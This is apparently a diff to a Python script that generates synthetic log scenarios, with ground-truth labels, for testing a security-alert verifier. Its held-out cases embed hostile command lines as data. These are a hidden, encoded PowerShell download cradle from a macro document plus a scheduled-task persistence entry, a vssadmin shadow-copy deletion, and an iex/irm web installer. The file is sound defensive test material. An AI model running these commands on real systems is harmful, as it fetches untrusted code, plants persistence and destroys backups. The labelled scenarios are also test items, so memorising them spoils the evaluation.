@@ -372,10 +372,268 @@ SCENARIOS = [
 ]
 
 
+# --- Held-out scenarios ---------------------------------------------------------------------
+# Written after the verifier and context evidence were tuned on s1-s7, and not used to tune
+# them. Their score is the honest one; s1-s7 catch regressions.
+
+
+def h1() -> list[dict[str, Any]]:
+    """A Word document starts hidden PowerShell that downloads from a listed IOC and persists."""
+    e = Events("H1")
+    for d in range(1, 6):
+        e.auth(at(d, 8, 50), "priya", "WS-PRIYA05", "10.30.1.85", "success", "kerberos")
+        e.proc(at(d, 9, 5), "priya", "WS-PRIYA05", "winword.exe", '"WINWORD.EXE"', "explorer.exe")
+    t = at(6, 10, 14)
+    e.proc(
+        t,
+        "priya",
+        "WS-PRIYA05",
+        "winword.exe",
+        '"WINWORD.EXE" /n "C:\\Users\\priya\\Downloads\\Invoice_4471.docm"',
+        "explorer.exe",
+    )
+    e.proc(
+        t + timedelta(seconds=20),
+        "priya",
+        "WS-PRIYA05",
+        "powershell.exe",
+        "powershell.exe -nop -w hidden -enc "
+        + encoded("IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.77/a')"),
+        "winword.exe",
+    )
+    e.net(t + timedelta(seconds=23), "WS-PRIYA05", "10.30.1.85", "192.0.2.77", 80, "priya")
+    e.proc(
+        t + timedelta(seconds=50),
+        "priya",
+        "WS-PRIYA05",
+        "schtasks.exe",
+        'schtasks.exe /create /sc onlogon /tn "OneDriveSync" /tr '
+        '"powershell -w hidden -f C:\\Users\\priya\\AppData\\Roaming\\sync.ps1"',
+        "powershell.exe",
+    )
+    return e.sorted()
+
+
+def h2() -> list[dict[str, Any]]:
+    """The domain logon script maps drives with a hidden PowerShell window every morning."""
+    e = Events("H2")
+    cmd = (
+        "powershell.exe -NoProfile -WindowStyle Hidden -File "
+        "\\\\corp.example\\NETLOGON\\map-drives.ps1"
+    )
+    for d in range(1, 7):
+        e.auth(at(d, 8, 30), "kim", "WS-KIM03", "10.30.1.70", "success", "kerberos")
+        e.proc(at(d, 8, 30, 20), "kim", "WS-KIM03", "powershell.exe", cmd, "gpscript.exe")
+        e.net(at(d, 8, 30, 24), "WS-KIM03", "10.30.1.70", "10.30.0.10", 445, "kim")
+    return e.sorted()
+
+
+def h3() -> list[dict[str, Any]]:
+    """Monday morning: six staff each mistype once through the usual Citrix gateway, then log on."""
+    e = Events("H3")
+    users = ["omar", "lucy", "ivan", "rosa", "nick", "zara"]
+    for d in range(1, 6):
+        for i, user in enumerate(users):
+            e.auth(at(d, 8, 50 + i), user, "CTX-GW01", "10.30.0.5", "success")
+    start = at(6, 8, 52)
+    for i, user in enumerate(users):
+        t = start + timedelta(seconds=70 * i)
+        e.auth(t, user, "CTX-GW01", "10.30.0.5", "failure")
+        e.auth(t + timedelta(seconds=25), user, "CTX-GW01", "10.30.0.5", "success")
+    return e.sorted()
+
+
+def h4() -> list[dict[str, Any]]:
+    """Wazuh (Windows): RDP password guessing, a successful logon, then shadow copies deleted."""
+    rows: list[dict[str, Any]] = []
+    agent = {"id": "007", "name": "WIN-FS01", "ip": "10.30.3.21"}
+
+    def add(t: datetime, rule: dict[str, Any], system: dict[str, Any], ed: dict[str, Any]) -> None:
+        rows.append(
+            {
+                "timestamp": t.strftime("%Y-%m-%dT%H:%M:%S.000+0000"),
+                "id": f"{int(t.timestamp())}.{300001 + len(rows)}",
+                "rule": rule,
+                "agent": agent,
+                "manager": {"name": "wazuh-manager"},
+                "decoder": {"name": "windows_eventchannel"},
+                "location": "EventChannel",
+                "data": {"win": {"system": {"computer": "WIN-FS01", **system}, "eventdata": ed}},
+            }
+        )
+
+    security = {"providerName": "Microsoft-Windows-Security-Auditing"}
+    logon = {"targetUserName": "Administrator", "ipAddress": "198.51.100.200", "logonType": "10"}
+    start = at(6, 1, 15)
+    for i in range(6):
+        add(
+            start + timedelta(seconds=20 * i),
+            {
+                "level": 5,
+                "id": "60122",
+                "description": "Logon failure - Unknown user or bad password.",
+                "groups": ["windows", "windows_security", "win_authentication_failed"],
+                "mitre": {"id": ["T1078"]},
+            },
+            {**security, "eventID": "4625"},
+            logon,
+        )
+    add(
+        start + timedelta(seconds=125),
+        {
+            "level": 10,
+            "id": "60204",
+            "description": "Multiple Windows logon failures.",
+            "groups": ["windows", "windows_security", "authentication_failures"],
+            "mitre": {"id": ["T1110"]},
+        },
+        {**security, "eventID": "4625"},
+        logon,
+    )
+    add(
+        start + timedelta(seconds=150),
+        {
+            "level": 3,
+            "id": "60106",
+            "description": "Windows logon success.",
+            "groups": ["windows", "windows_security", "authentication_success"],
+            "mitre": {"id": ["T1078"]},
+        },
+        {**security, "eventID": "4624"},
+        logon,
+    )
+    add(
+        start + timedelta(minutes=7),
+        {
+            "level": 12,
+            "id": "92032",
+            "description": "Volume shadow copies deleted with vssadmin, possible ransomware.",
+            "groups": ["sysmon", "sysmon_event1", "windows"],
+            "mitre": {"id": ["T1490"]},
+        },
+        {"providerName": "Microsoft-Windows-Sysmon", "eventID": "1"},
+        {
+            "image": "C:\\Windows\\System32\\vssadmin.exe",
+            "commandLine": "vssadmin.exe delete shadows /all /quiet",
+            "parentImage": "C:\\Windows\\System32\\cmd.exe",
+            "user": "WIN-FS01\\Administrator",
+        },
+    )
+    return rows
+
+
+def h5() -> list[dict[str, Any]]:
+    """A developer pipes a web installer into Invoke-Expression; nothing else is recorded."""
+    e = Events("H5")
+    for d in range(1, 6):
+        e.auth(at(d, 9, 10), "omar", "WS-OMAR02", "10.30.1.92", "success", "kerberos")
+        e.proc(at(d, 9, 12), "omar", "WS-OMAR02", "code.exe", '"Code.exe"', "explorer.exe")
+    t = at(6, 11, 3)
+    e.proc(
+        t,
+        "omar",
+        "WS-OMAR02",
+        "powershell.exe",
+        'powershell.exe -c "iex (irm https://tools.example.net/install.ps1)"',
+        "WindowsTerminal.exe",
+    )
+    e.net(t + timedelta(seconds=2), "WS-OMAR02", "10.30.1.92", "198.51.100.140", 443, "omar")
+    return e.sorted()
+
+
+def h6() -> list[dict[str, Any]]:
+    """The backup service account logs on over VPN from a listed spray source after guessing."""
+    e = Events("H6")
+    for d in range(1, 6):
+        e.auth(at(d, 1, 0), "svc_backup", "SRV-BKP01", "10.30.2.20", "success", "kerberos")
+    start = at(6, 3, 12)
+    for i in range(5):
+        e.auth(start + timedelta(seconds=45 * i), "svc_backup", "VPN-GW01", "192.0.2.77", "failure")
+    e.auth(start + timedelta(minutes=4), "svc_backup", "VPN-GW01", "192.0.2.77", "success")
+    return e.sorted()
+
+
+HOLDOUT = [
+    {
+        "id": "h1_macro_powershell_persistence",
+        "title": "Word macro starts hidden PowerShell, IOC download, scheduled task",
+        "truth": "malicious",
+        "story": "priya opened Invoice_4471.docm; Word started hidden, encoded PowerShell that "
+        "downloaded from the listed IOC address 192.0.2.77 and created a logon task.",
+        "build": h1,
+        "adapter": "generic",
+        "expected_alerts": {"process.suspicious_powershell": 1, "network.local_ioc_match": 1},
+        "investigate": "process.suspicious_powershell",
+    },
+    {
+        "id": "h2_logon_script_hidden_window",
+        "title": "Domain logon script runs PowerShell hidden every morning",
+        "truth": "benign",
+        "story": "Group Policy (gpscript.exe) runs the NETLOGON drive-mapping script with a "
+        "hidden window at every logon on kim's workstation; it reaches only the file server.",
+        "build": h2,
+        "adapter": "generic",
+        "expected_alerts": {"process.suspicious_powershell": 6},
+        "investigate": "process.suspicious_powershell",
+    },
+    {
+        "id": "h3_monday_typos_gateway",
+        "title": "Six users mistype once each through the usual Citrix gateway",
+        "truth": "benign",
+        "story": "Six staff who log on through CTX-GW01 (10.30.0.5) every morning each failed "
+        "once and succeeded 25 seconds later. By source it looks like a spray, but each "
+        "account got in on its second try from its usual source.",
+        "build": h3,
+        "adapter": "generic",
+        "expected_alerts": {"auth.password_spray": 1},
+        "investigate": "auth.password_spray",
+    },
+    {
+        "id": "h4_wazuh_rdp_shadow_delete",
+        "title": "Wazuh (Windows): RDP guessing, logon, shadow copies deleted",
+        "truth": "malicious",
+        "story": "198.51.100.200 guessed Administrator's password over RDP on WIN-FS01 and "
+        "deleted all volume shadow copies seven minutes later, a ransomware precursor.",
+        "build": h4,
+        "adapter": "wazuh",
+        "expected_alerts": {
+            "auth.failures_then_success": 1,
+            "auth.repeated_failures": 1,
+            "siem.high_severity_alert": 2,
+        },
+        "investigate": "auth.failures_then_success",
+    },
+    {
+        "id": "h5_dev_installer_iex",
+        "title": "Developer pipes a web installer into Invoke-Expression",
+        "truth": "undetermined",
+        "story": "omar ran 'iex (irm https://tools.example.net/install.ps1)' from Windows "
+        "Terminal. Many developer tools install this way, and so does malware; the script's "
+        "content and what it did afterwards are not in the data.",
+        "build": h5,
+        "adapter": "generic",
+        "expected_alerts": {"process.suspicious_powershell": 1},
+        "investigate": "process.suspicious_powershell",
+    },
+    {
+        "id": "h6_service_account_ioc_vpn",
+        "title": "Backup service account guessed over VPN from a listed spray source",
+        "truth": "malicious",
+        "story": "svc_backup only ever logs on from the backup server; at 03:12 it was guessed "
+        "over VPN from 192.0.2.77, an address on the IOC list as a password-spray source.",
+        "build": h6,
+        "adapter": "generic",
+        "expected_alerts": {"auth.failures_then_success": 1, "auth.repeated_failures": 1},
+        "investigate": "auth.failures_then_success",
+    },
+]
+
+
 def main() -> None:
     (OUT / "scenarios").mkdir(parents=True, exist_ok=True)
     manifest = []
-    for spec in SCENARIOS:
+    specs = [s | {"set": "tuning"} for s in SCENARIOS] + [s | {"set": "holdout"} for s in HOLDOUT]
+    for spec in specs:
         rows = spec["build"]()
         file = f"scenarios/{spec['id']}.jsonl"
         (OUT / file).write_text(
